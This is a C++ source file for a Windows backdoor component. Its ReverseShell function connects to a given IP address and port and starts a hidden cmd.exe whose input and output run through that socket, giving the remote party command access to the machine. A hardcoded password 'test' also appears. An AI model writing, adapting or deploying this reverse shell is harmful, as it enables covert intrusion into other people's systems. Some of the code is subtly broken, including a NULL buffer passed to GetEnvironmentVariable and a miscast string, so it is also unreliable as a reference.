#include "Shell.h"
#define RCVBUFSIZE 1024
#define PASSWORD "test"
#define BUFF_SIZE 1024

Shell::Shell()
{
	doServer = TRUE;
}

Shell::~Shell()
{
}

//this is createprocess shell, no extensions possible.
BOOL Shell::ReverseShell(unsigned short cbPort,char *cbIp)
{
	//Declaring the vars
    SOCKET sock;
    struct sockaddr_in cbAddr;
    WSADATA wsaData;
	STARTUPINFO si;
	PROCESS_INFORMATION pi={0};
	LPWSTR comspec = NULL;

//starting up wsa
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
		return FALSE;
    }
//Make shure it's WSASocket()
    if ((sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,0,0,0)) < 0)
	{
		WSACleanup();
		return FALSE;
	}

//filling the struct
    memset(&cbAddr, 0, sizeof(cbAddr));
    cbAddr.sin_family      = AF_INET;
    cbAddr.sin_addr.s_addr = inet_addr(cbIp);
    cbAddr.sin_port        = htons(cbPort);

	// Establish the connection to the echo server
    if (connect(sock, (struct sockaddr *) &cbAddr, sizeof(cbAddr)) < 0)
	{
		closesocket(sock);
		WSACleanup();
		return FALSE;
	}
//Setting up the startupinfo etc to make shure cmd get's a both way traffic
		memset(&si,0,sizeof(si));
		GetStartupInfo(&si);
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		si.hStdInput = (HANDLE)sock;
		si.hStdOutput = (HANDLE)sock;
		si.hStdError =(HANDLE)sock;
//getting cmd.exe a bit more fancier then hardcoding it.
		if(GetEnvironmentVariable((LPWSTR)"COMSPEC", comspec, MAX_PATH) == 0)
		{
			closesocket(sock);
			return FALSE;
		}
		if(!CreateProcess(NULL,comspec, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, 0, NULL, &si, &pi)) //CREATE_NO_WINDOW
		{
			closesocket(sock);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		closesocket(sock);
	return TRUE;
}